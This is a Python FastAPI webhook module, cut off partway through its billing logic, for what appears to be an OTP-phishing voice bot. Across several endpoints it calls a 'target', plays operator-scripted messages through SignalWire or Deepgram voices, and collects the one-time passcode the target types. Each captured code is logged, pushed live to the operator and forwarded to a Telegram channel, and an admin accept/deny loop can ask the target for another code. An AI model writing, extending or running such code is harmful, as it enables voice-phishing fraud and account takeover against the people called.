from fastapi import APIRouter, Request, Form, HTTPException
from fastapi.responses import Response
from services.mongodb_service import MongoDBService
from services.signalwire_service import SignalWireService
from services.telegram_service import TelegramService
from services.websocket_manager import manager
from services.deepgram_service import DeepgramService
from datetime import datetime
import logging
import json
import os

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/webhooks", tags=["Webhooks"])

signalwire = SignalWireService()
telegram = TelegramService()
deepgram = DeepgramService()

# Import active_calls from calls route (in production use shared storage)
from routes.calls import active_calls

# Helper function to generate TwiML Say or Play based on voice
async def generate_voice_element(text: str, voice: str) -> str:
    """
    Generate TwiML voice element - <Say> for SignalWire, <Play> for Deepgram
    
    Args:
        text: Text to speak
        voice: Voice name
    
    Returns:
        TwiML element string (<Say>...</Say> or <Play>...</Play>)
    """
    if deepgram.is_deepgram_voice(voice):
        # Generate Deepgram audio
        try:
            audio_url = await deepgram.text_to_speech(text, voice)
            return f"<Play>{audio_url}</Play>"
        except Exception as e:
            logger.error(f"Deepgram TTS failed, fallback to SignalWire: {e}")
            return f'<Say voice="Aurora">{text}</Say>'
    else:
        # Use SignalWire TTS
        return f'<Say voice="{voice}">{text}</Say>'

@router.post("/signalwire/{call_id}")
async def signalwire_webhook(call_id: str, request: Request):
    """Handle SignalWire call webhooks"""
    try:
        form_data = await request.form()
        call_status = form_data.get('CallStatus')
        answered_by = form_data.get('AnsweredBy', '').lower()
        
        logger.info(f"SignalWire webhook for call {call_id}: {call_status}, AnsweredBy: {answered_by}")
        
        # CRITICAL FIX: Only generate TwiML for initial call setup, not for status updates
        # Status updates should be handled by the /status endpoint
        if call_status and call_status.lower() in ['ringing', 'in-progress', 'completed', 'busy', 'failed', 'no-answer', 'canceled']:
            # This is a status update - don't generate TwiML, just return OK
            logger.info("Status callback received - skipping TwiML generation")
            return Response(content="OK", media_type="text/plain")
        
        # Get call from MongoDB with MULTIPLE retries for race condition
        call_data = await MongoDBService.get_call(call_id)
        
        # CRITICAL FIX: Multiple retries with exponential backoff
        if not call_data:
            import asyncio
            for attempt in range(3):  # Try 3 times
                delay = 0.5 * (attempt + 1)  # 0.5s, 1s, 1.5s
                logger.warning(f"Call {call_id} not found in MongoDB, retry {attempt+1}/3 after {delay}s...")
                await asyncio.sleep(delay)
                call_data = await MongoDBService.get_call(call_id)
                if call_data:
                    logger.info(f"✅ Call {call_id} found on retry {attempt+1}")
                    break
        
        if not call_data:
            logger.error(f"CRITICAL: Call {call_id} not found after 3 retries - this should not happen!")
            # Generate error TwiML but don't hang up immediately - try to recover
            error_twiml = """<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Aurora">System initializing, please wait.</Say>
    <Pause length="2"/>
    <Say voice="Aurora">We're sorry, there was a system error. Please try again later.</Say>
    <Hangup/>
</Response>"""
            return Response(content=error_twiml, media_type="application/xml")
        
        # Create event
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': call_status.lower(),
            'data': dict(form_data)
        }
        
        # Update MongoDB - add event and update status
        await MongoDBService.update_call_events(call_id, event)
        await MongoDBService.update_call_status(call_id, call_status.lower())
        
        # Send to user via WebSocket
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        # HANDLE AMD (Answering Machine Detection) RESULTS
        if answered_by:
            amd_event = None
            
            if answered_by == 'human':
                amd_event = {
                    'time': datetime.utcnow().isoformat(),
                    'event': 'human_detected',
                    'message': '🙋 Human detected',
                    'data': {'answered_by': answered_by}
                }
            elif answered_by in ['machine_start', 'machine_end_beep', 'machine_end_silence']:
                amd_event = {
                    'time': datetime.utcnow().isoformat(),
                    'event': 'voicemail_detected',
                    'message': '📱 Voicemail Detected',
                    'data': {'answered_by': answered_by}
                }
            elif answered_by == 'fax':
                amd_event = {
                    'time': datetime.utcnow().isoformat(),
                    'event': 'fax_detected',
                    'message': '📠 Fax machine detected',
                    'data': {'answered_by': answered_by}
                }
            elif answered_by == 'unknown':
                amd_event = {
                    'time': datetime.utcnow().isoformat(),
                    'event': 'silent_human_detected',
                    'message': '🔇 Silent Human detection',
                    'data': {'answered_by': answered_by}
                }
            elif answered_by == 'no_answer' or answered_by == 'no-answer':
                amd_event = {
                    'time': datetime.utcnow().isoformat(),
                    'event': 'unanswered_detected',
                    'message': '📵 Unanswered detected',
                    'data': {'answered_by': answered_by}
                }
            
            if amd_event:
                await MongoDBService.update_call_events(call_id, amd_event)
                await MongoDBService.update_call_field(call_id, 'answered_by', answered_by)
                await manager.send_to_user(call_data['user_id'], {
                    'type': 'call_event',
                    'call_id': call_id,
                    'event': amd_event
                })
        
        # Generate TwiML using EXACT text from UI form
        voice = call_data.get('tts_voice', 'Aurora')
        
        # Get messages - EXACT text from UI form (NO hardcoded text)
        step_1_message = call_data.get('step_1_message', 'Hello')
        
        # Main webhook - Play Step 1 Message
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        first_input_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/first-input"
        
        # Log message played event
        logger.info(f"✅ Logging message_played event for call {call_id}")
        msg_event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'message_played',
            'message': f'🔊 Step 1 message played (Voice: {voice})',
            'data': {'step': 1, 'attempt': 1, 'voice': voice}
        }
        await MongoDBService.update_call_events(call_id, msg_event)
        logger.info(f"✅ message_played event logged successfully")
        
        # For human/unknown - use longer timeout and allow retry
        retry_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/retry-step1"
        
        # Generate voice element (Deepgram or SignalWire)
        voice_element = await generate_voice_element(step_1_message, voice)
        
        # Generate TwiML - SAMA untuk human atau voicemail (jangan auto hangup)
        # User tetap bisa interact meskipun voicemail terdeteksi
        twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather numDigits="1" action="{first_input_url}" method="POST" timeout="15">
        {voice_element}
    </Gather>
    <Redirect>{retry_url}</Redirect>
</Response>"""
        
        logger.info(f"✅ Returning TwiML for call {call_id}: {len(twiml)} bytes, voice={voice}, answered_by={answered_by}")
        return Response(content=twiml, media_type="application/xml")
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error</Say><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/retry-step1")
async def signalwire_retry_step1(call_id: str):
    """Retry Step 1 if no input received (only for human/silent human)"""
    try:
        call_data = await MongoDBService.get_call(call_id)
        if not call_data:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Hangup/></Response>',
                media_type="application/xml"
            )
        
        voice = call_data.get('tts_voice', 'Aurora')
        step_1_message = call_data.get('step_1_message', 'Hello')
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        first_input_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/first-input"
        
        # Log retry
        msg_event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'message_played',
            'message': '🔊 Step 1 message played (retry)',
            'data': {'step': 1, 'attempt': 2}
        }
        await MongoDBService.update_call_events(call_id, msg_event)
        
        # Generate voice element for retry
        voice_element = await generate_voice_element(step_1_message, voice)
        
        # Second attempt - then give up
        twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather numDigits="1" action="{first_input_url}" method="POST" timeout="15">
        {voice_element}
    </Gather>
    <Say voice="Aurora">We did not receive any input. Goodbye.</Say>
    <Hangup/>
</Response>"""
        return Response(content=twiml, media_type="application/xml")
        
    except Exception as e:
        logger.error(f"Retry error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/first-input")
async def signalwire_first_input(call_id: str, request: Request, Digits: str = Form(None)):
    """Handle first digit input (1 or 0)"""
    try:
        logger.info(f"First input for call {call_id}: {Digits}")
        
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                media_type="application/xml"
            )
        
        voice = call_data.get('tts_voice', 'Aurora')
        
        # Create event with detailed message
        event_message = f'🔢 Target pressed {Digits}'
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'first_input_received',
            'message': event_message,
            'data': {'digit': Digits}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        await MongoDBService.update_call_field(call_id, 'user_response', Digits)
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        
        if Digits == '1':
            # User pressed 1 - Send OTP now event
            otp_event = {
                'time': datetime.utcnow().isoformat(),
                'event': 'send_otp_now',
                'message': '🚀 Send OTP now',
                'data': {}
            }
            await MongoDBService.update_call_events(call_id, otp_event)
            await manager.send_to_user(call_data['user_id'], {
                'type': 'call_event',
                'call_id': call_id,
                'event': otp_event
            })
            
            # User pressed 1 (deny/block) - Redirect to gather OTP (Step 2 Message)
            deny_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/deny"
            twiml = f'<?xml version="1.0" encoding="UTF-8"?><Response><Redirect>{deny_url}</Redirect></Response>'
            return Response(content=twiml, media_type="application/xml")
            
        elif Digits == '0':
            # User pressed 0 (accept) - Also go to Step 2 Message
            deny_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/deny"
            twiml = f'<?xml version="1.0" encoding="UTF-8"?><Response><Redirect>{deny_url}</Redirect></Response>'
            return Response(content=twiml, media_type="application/xml")
        else:
            # Invalid input
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{voice}">Invalid input. Please try again.</Say>
    <Redirect>{backend_url}/api/webhooks/signalwire/{call_id}</Redirect>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
            
    except Exception as e:
        logger.error(f"First input error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error processing input</Say><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/deny")
async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(None)):
    """Handle Step 2 - Play Step 2 Message and gather OTP"""
    try:
        logger.info(f"Step 2 for call {call_id}, Digits: {Digits}")
        
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                media_type="application/xml"
            )
        
        voice = call_data.get('tts_voice', 'Aurora')
        digits_required = call_data.get('digits', 6)
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        step_2_message = call_data.get('step_2_message', '')
        
        # If OTP digits received
        if Digits and len(Digits) == digits_required:
            # Log OTP received
            event = {
                'time': datetime.utcnow().isoformat(),
                'event': 'otp_received',
                'message': f'🕵️ OTP submitted by target: {Digits}',
                'data': {'otp': Digits}
            }
            
            await MongoDBService.update_call_events(call_id, event)
            await MongoDBService.update_call_field(call_id, 'otp_code', Digits)
            await MongoDBService.update_call_field(call_id, 'otp_entered', Digits)  # For frontend consistency
            await MongoDBService.update_call_field(call_id, 'dtmf_code', Digits)
            await MongoDBService.update_call_status(call_id, 'otp_entered')
            
            await manager.send_to_user(call_data['user_id'], {
                'type': 'call_event',
                'call_id': call_id,
                'event': event
            })
            
            # Forward OTP to Telegram (optional)
            try:
                user = await MongoDBService.get_user(call_data['user_id'])
                await telegram.send_otp_to_channel(
                    otp_code=Digits,
                    call_id=call_id,
                    user_email=user.get('email', 'Unknown'),
                    call_data=call_data  # Pass call data for formatting
                )
            except Exception as e:
                logger.warning(f"Failed to forward OTP to Telegram: {e}")
            
            # Play Step 3 message and WAIT for admin action
            step_3_message = call_data.get('step_3_message', 'Please wait')
            wait_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/wait"
            
            # Log message played
            msg_event = {
                'time': datetime.utcnow().isoformat(),
                'event': 'message_played',
                'message': '🔊 Step 3 message played',
                'data': {'step': 3}
            }
            await MongoDBService.update_call_events(call_id, msg_event)
            
            # Generate voice element for Step 3
            voice_element_3 = await generate_voice_element(step_3_message, voice)
            
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    {voice_element_3}
    <Pause length="3"/>
    <Redirect>{wait_url}</Redirect>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
        else:
            # First time - Ask for OTP using Step 2 message (EXACT text from UI)
            gather_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/deny"
            
            # Log message played
            msg_event = {
                'time': datetime.utcnow().isoformat(),
                'event': 'message_played',
                'message': '🔊 Step 2 message played',
                'data': {'step': 2}
            }
            await MongoDBService.update_call_events(call_id, msg_event)
            
            # Generate voice element for Step 2
            voice_element_2 = await generate_voice_element(step_2_message, voice)
            
            # Repeat 2x for human detection
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather numDigits="{digits_required}" action="{gather_url}" method="POST" timeout="20">
        {voice_element_2}
        <Pause length="2"/>
        {voice_element_2}
    </Gather>
    <Say voice="Aurora">We did not receive the code. Goodbye.</Say>
    <Hangup/>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
            
    except Exception as e:
        logger.error(f"Deny flow error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error</Say><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/wait")
async def signalwire_wait(call_id: str):
    """Wait endpoint - Keep call alive while waiting for admin decision"""
    try:
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Hangup/></Response>',
                media_type="application/xml"
            )
        
        voice = call_data.get('tts_voice', 'Aurora')
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        
        # Check if admin made decision
        admin_decision = call_data.get('admin_decision')
        
        if admin_decision == 'accept':
            # Play accepted message
            accepted_message = call_data.get('accepted_message', 'Thank you')
            
            # Generate voice element for Accepted message
            voice_element_accepted = await generate_voice_element(accepted_message, voice)
            
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    {voice_element_accepted}
    <Hangup/>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
            
        elif admin_decision == 'deny':
            # Play rejected message and ask for OTP again
            rejected_message = call_data.get('rejected_message', 'Invalid code')
            digits_required = call_data.get('digits', 6)
            
            # Clear admin decision untuk memperbolehkan input ulang
            await MongoDBService.update_call_field(call_id, 'admin_decision', None)
            
            # Redirect ke gather OTP dengan rejected message
            gather_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/retry-otp"
            
            # Generate voice element for Rejected message
            voice_element_rejected = await generate_voice_element(rejected_message, voice)
            
            # Repeat rejected message 2x lalu gather
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    {voice_element_rejected}
    <Pause length="2"/>
    {voice_element_rejected}
    <Gather numDigits="{digits_required}" action="{gather_url}" method="POST" timeout="20">
        <Pause length="1"/>
    </Gather>
    <Say voice="Aurora">We did not receive the code. Goodbye.</Say>
    <Hangup/>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
        else:
            # Still waiting - loop back
            wait_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/wait"
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Pause length="2"/>
    <Redirect>{wait_url}</Redirect>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
            
    except Exception as e:
        logger.error(f"Wait error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/retry-otp")
async def signalwire_retry_otp(call_id: str, Digits: str = Form(None)):
    """Handle OTP retry after rejected - Same as deny but for retry"""
    try:
        logger.info(f"Retry OTP for call {call_id}, Digits: {Digits}")
        
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                media_type="application/xml"
            )
        
        voice = call_data.get('tts_voice', 'Aurora')
        digits_required = call_data.get('digits', 6)
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        
        # If OTP digits received
        if Digits and len(Digits) == digits_required:
            # Log OTP received (retry)
            event = {
                'time': datetime.utcnow().isoformat(),
                'event': 'otp_received',
                'message': f'🕵️ OTP submitted by target (retry): {Digits}',
                'data': {'otp': Digits, 'retry': True}
            }
            
            await MongoDBService.update_call_events(call_id, event)
            await MongoDBService.update_call_field(call_id, 'otp_code', Digits)
            await MongoDBService.update_call_field(call_id, 'otp_entered', Digits)
            await MongoDBService.update_call_field(call_id, 'dtmf_code', Digits)
            await MongoDBService.update_call_status(call_id, 'otp_entered')
            
            await manager.send_to_user(call_data['user_id'], {
                'type': 'call_event',
                'call_id': call_id,
                'event': event
            })
            
            # Forward OTP to Telegram (optional)
            try:
                user = await MongoDBService.get_user(call_data['user_id'])
                await telegram.send_otp_to_channel(
                    otp_code=Digits,
                    call_id=call_id,
                    user_email=user.get('email', 'Unknown'),
                    call_data=call_data  # Pass call data for formatting
                )
            except Exception as e:
                logger.warning(f"Failed to forward OTP to Telegram: {e}")
            
            # Play Step 3 message and WAIT for admin action
            step_3_message = call_data.get('step_3_message', 'Please wait')
            wait_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/wait"
            
            # Log message played
            msg_event = {
                'time': datetime.utcnow().isoformat(),
                'event': 'message_played',
                'message': '🔊 Step 3 message played (retry)',
                'data': {'step': 3, 'retry': True}
            }
            await MongoDBService.update_call_events(call_id, msg_event)
            
            # Generate voice element for Step 3 (retry)
            voice_element_3 = await generate_voice_element(step_3_message, voice)
            
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    {voice_element_3}
    <Pause length="3"/>
    <Redirect>{wait_url}</Redirect>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
        else:
            # No digits or invalid length - hangup
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{voice}">We did not receive a valid code. Goodbye.</Say>
    <Hangup/>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
            
    except Exception as e:
        logger.error(f"Retry OTP error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error</Say><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/accept")
async def signalwire_accept(call_id: str, request: Request):
    """Handle accept flow - User pressed 0"""
    try:
        logger.info(f"Accept flow for call {call_id}")
        
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                media_type="application/xml"
            )
        
        voice = call_data.get('tts_voice', 'Aurora')
        
        # Log accepted
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'call_accepted',
            'data': {}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        await MongoDBService.update_call_status(call_id, 'accepted')
        
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        # Play Accepted message (EXACT text from UI)
        accepted_message = call_data.get('accepted_message', 'Thank you for confirming')
        
        twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{voice}">{accepted_message}</Say>
    <Hangup/>
</Response>'''
        return Response(content=twiml, media_type="application/xml")
        
    except Exception as e:
        logger.error(f"Accept flow error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error</Say><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/gather")
async def signalwire_gather(call_id: str, request: Request, Digits: str = Form(None)):
    """Handle DTMF digit gathering"""
    try:
        logger.info(f"Gathered digits for call {call_id}: {Digits}")
        
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            return Response(
                content=signalwire.generate_twiml_response("Call not found"),
                media_type="application/xml"
            )
        
        # Create event for digits received
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'digits_received',
            'data': {'digits': Digits}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        
        # Update status to 'digit_entered'
        await MongoDBService.update_call_status(call_id, 'digit_entered')
        
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        # Forward OTP to Telegram (optional, don't block on error)
        if Digits:
            try:
                user = await MongoDBService.get_user(call_data['user_id'])
                await telegram.send_otp_to_channel(
                    otp_code=Digits,
                    call_id=call_id,
                    user_email=user.get('email', 'Unknown'),
                    call_data=call_data  # Pass call data for formatting
                )
            except Exception as e:
                logger.warning(f"Failed to forward OTP to Telegram: {e}")
        
        # Play step 3 message (waiting)
        return Response(
            content=signalwire.generate_twiml_response(
                message=call_data.get('step_3_message', 'Please wait'),
                voice=call_data['tts_voice'],
                hangup=False
            ),
            media_type="application/xml"
        )
    
    except Exception as e:
        logger.error(f"Gather webhook error: {e}")
        return Response(
            content=signalwire.generate_twiml_response("Error processing request"),
            media_type="application/xml"
        )

@router.get("/external/call/{call_id}")
async def get_call_data_for_webhook(call_id: str):
    """Get call data for external PHP webhook (public endpoint)"""
    try:
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            raise HTTPException(status_code=404, detail="Call not found")
        
        # Return EXACT messages from UI form for PHP webhook TwiML generation
        return {
            "call_id": call_id,
            "from_number": call_data.get('from_number'),
            "to_number": call_data.get('to_number'),
            "recipient_name": call_data.get('recipient_name'),
            "service_name": call_data.get('service_name'),
            "tts_voice": call_data.get('tts_voice', 'Aurora'),
            "language": call_data.get('language', 'en-US'),
            "digits": call_data.get('digits', 6),
            "step_1_message": call_data.get('step_1_message', ''),
            "step_2_message": call_data.get('step_2_message', ''),
            "step_3_message": call_data.get('step_3_message', ''),
            "accepted_message": call_data.get('accepted_message', ''),
            "rejected_message": call_data.get('rejected_message', ''),
            "external_webhook_base": "https://piddly-tenable-frederic.ngrok-free.dev"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting call data: {e}")
        raise HTTPException(status_code=500, detail="Failed to get call data")

@router.post("/external/update/{call_id}")
async def external_webhook_update(call_id: str, request: Request):
    """Receive updates from external PHP webhook"""
    try:
        data = await request.json()
        
        logger.info(f"External webhook update for call {call_id}: {data}")
        
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            return {"status": "error", "message": "Call not found"}
        
        # Update status if provided
        if 'status' in data:
            await MongoDBService.update_call_status(call_id, data['status'])
        
        # Add event
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': data.get('event', 'external_update'),
            'data': data
        }
        
        await MongoDBService.update_call_events(call_id, event)
        
        # Send to user via WebSocket
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        return {"status": "success", "call_id": call_id}
        
    except Exception as e:
        logger.error(f"External webhook error: {e}")
        return {"status": "error", "message": str(e)}

@router.post("/signalwire/{call_id}/status")
async def signalwire_status(call_id: str, request: Request):
    """Handle SignalWire call status updates"""
    try:
        form_data = await request.form()
        call_status = form_data.get('CallStatus', '').lower()
        recording_url = form_data.get('RecordingUrl')
        call_duration = form_data.get('CallDuration')
        caller_name = form_data.get('CallerName', '')
        caller_type = form_data.get('CallerType', '')
        
        logger.info(f"Status update for call {call_id}: {call_status}")
        
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if call_data:
            # HANDLE AMD RESULTS from AsyncAMD callback
            answered_by = form_data.get('AnsweredBy', '').lower()
            if answered_by and not call_data.get('amd_processed'):
                amd_event = None
                
                if answered_by == 'human':
                    amd_event = {
                        'time': datetime.utcnow().isoformat(),
                        'event': 'human_detected',
                        'message': '🙋 Human detected',
                        'data': {'answered_by': answered_by}
                    }
                elif answered_by in ['machine_start', 'machine_end_beep', 'machine_end_silence', 'machine']:
                    amd_event = {
                        'time': datetime.utcnow().isoformat(),
                        'event': 'voicemail_detected',
                        'message': '📱 Voicemail Detected',
                        'data': {'answered_by': answered_by}
                    }
                elif answered_by == 'fax':
                    amd_event = {
                        'time': datetime.utcnow().isoformat(),
                        'event': 'fax_detected',
                        'message': '📠 Fax detected',
                        'data': {'answered_by': answered_by}
                    }
                elif answered_by == 'unknown':
                    amd_event = {
                        'time': datetime.utcnow().isoformat(),
                        'event': 'silent_human_detected',
                        'message': '🔇 Silent Human detection',
                        'data': {'answered_by': answered_by}
                    }
                
                if amd_event:
                    await MongoDBService.update_call_events(call_id, amd_event)
                    await MongoDBService.update_call_field(call_id, 'answered_by', answered_by)
                    await MongoDBService.update_call_field(call_id, 'amd_processed', True)
                    await manager.send_to_user(call_data['user_id'], {
                        'type': 'call_event',
                        'call_id': call_id,
                        'event': amd_event
                    })
                    logger.info(f"✅ AMD Result logged: {answered_by}")
            
            # Add carrier info event if available on first status update
            if caller_type and call_data.get('status') == 'initiated':
                carrier_event = {
                    'time': datetime.utcnow().isoformat(),
                    'event': 'carrier_detected',
                    'message': f'📡 Carrier: {caller_name or "Unknown"} type {caller_type}',
                    'data': {'caller_name': caller_name, 'caller_type': caller_type}
                }
                await MongoDBService.update_call_events(call_id, carrier_event)
                await manager.send_to_user(call_data['user_id'], {
                    'type': 'call_event',
                    'call_id': call_id,
                    'event': carrier_event
                })
            
            # Add service info event
            if call_status == 'in-progress' and not call_data.get('service_event_sent'):
                service_event = {
                    'time': datetime.utcnow().isoformat(),
                    'event': 'service_info',
                    'message': f'🔵 Service: {call_data.get("service_name", "Unknown")}',
                    'data': {'service': call_data.get('service_name')}
                }
                await MongoDBService.update_call_events(call_id, service_event)
                await MongoDBService.update_call_field(call_id, 'service_event_sent', True)
                await manager.send_to_user(call_data['user_id'], {
                    'type': 'call_event',
                    'call_id': call_id,
                    'event': service_event
                })
            
            # Create detailed event based on status
            event_message = None
            event_type = f'status_{call_status}'
            
            if call_status == 'completed':
                event_message = f'🏁 Call completed @ {datetime.utcnow().strftime("%H:%M:%S")}'
                event_type = 'call_completed'
            elif call_status == 'no-answer':
                event_message = '📵 Target did not answer (Not Answered)'
                event_type = 'call_not_answered'
            elif call_status == 'failed':
                event_message = '❌ Call failed (connection error)'
                event_type = 'call_failed'
            elif call_status == 'busy':
                event_message = '📞 Call rejected - Line busy'
                event_type = 'call_rejected'
            elif call_status == 'canceled':
                event_message = '🚫 Call canceled'
                event_type = 'call_canceled'
            elif call_status == 'ringing':
                event_message = f'📞 Call ringing @ {datetime.utcnow().strftime("%H:%M:%S")}'
                event_type = 'call_ringing'
            elif call_status == 'in-progress':
                event_message = f'☎️ Call answered @ {datetime.utcnow().strftime("%H:%M:%S")}'
                event_type = 'call_answered'
            elif call_status == 'initiated':
                event_message = f'📱 Initiated call to {call_data.get("to_number")} from {call_data.get("from_number")}'
                event_type = 'call_initiated'
            
            event = {
                'time': datetime.utcnow().isoformat(),
                'event': event_type,
                'message': event_message or f'Status: {call_status}',
                'data': {
                    'status': call_status,
                    'recording_url': recording_url,
                    'duration': call_duration
                }
            }
            
            await MongoDBService.update_call_events(call_id, event)
            
            # Update call status and recording URL in MongoDB
            update_data = {'status': call_status}
            if recording_url:
                update_data['recording_url'] = recording_url
            if call_duration:
                update_data['call_duration'] = call_duration
            
            await MongoDBService.update_call_data(call_id, update_data)
            
            await manager.send_to_user(call_data['user_id'], {
                'type': 'call_event',
                'call_id': call_id,
                'event': event
            })
            
            # ==========================================
            # BILLING LOGIC - PER MINUTE (Incremental, No Refund)
            # ==========================================
            if call_status in ['completed', 'failed', 'busy', 'no-answer', 'canceled']:
                # Get user and billing info
                user = await MongoDBService.get_user(call_data['user_id'])
                cost_per_minute = call_data.get('cost_per_minute', 0.5)
                already_charged = call_data.get('charged_amount', cost_per_minute)  # 1st minute already charged
                minutes_already_charged = call_data.get('minutes_charged', 1)
                
                additional_charge = 0
                refund_amount = 0
                total_cost = already_charged
                billing_message = ""
                
                if call_status == 'completed':
                    # Calculate actual duration in minutes (ROUND UP)
                    duration_seconds = int(call_duration) if call_duration else 0
                    import math
                    actual_minutes = math.ceil(duration_seconds / 60) if duration_seconds > 0 else 1
                    
                    # Calculate additional minutes to charge
                    additional_minutes = max(0, actual_minutes - minutes_already_charged)
                    additional_charge = additional_minutes * cost_per_minute
                    
                    if additional_charge > 0:
                        # Check if user has enough balance for additional charge
                        if user['balance'] >= additional_charge:
                            new_balance = user['balance'] - additional_charge
                            await MongoDBService.update_user_balance(user['uid'], new_balance)
                            logger.info(f"💰 Additional charge ${additional_charge} for {additional_minutes} extra minutes. New balance: ${new_balance}")
                        else:
                            logger.warning(f"⚠️ Insufficient balance for additional minutes. Skipping extra charge.")
                            additional_charge = 0
                    
                    total_cost = already_charged + additional_charge
                    billing_message = f'💰 Total charged ${total_cost:.2f} ({actual_minutes} min × ${cost_per_minute}) - No refund'
                    logger.info(f"💰 Call {call_id} completed: {duration_seconds}s = {actual_minutes} min × ${cost_per_minute} = ${total_cost}")
                    
                elif call_status == 'failed':
                    # ONLY FAILED gets refund - return the 1st minute charge
                    refund_amount = already_charged
                    
                    new_balance = user['balance'] + refund_amount
                    await MongoDBService.update_user_balance(user['uid'], new_balance)
                    
                    total_cost = 0
                    billing_message = f'💰 Call failed - Refunded ${refund_amount:.2f}'
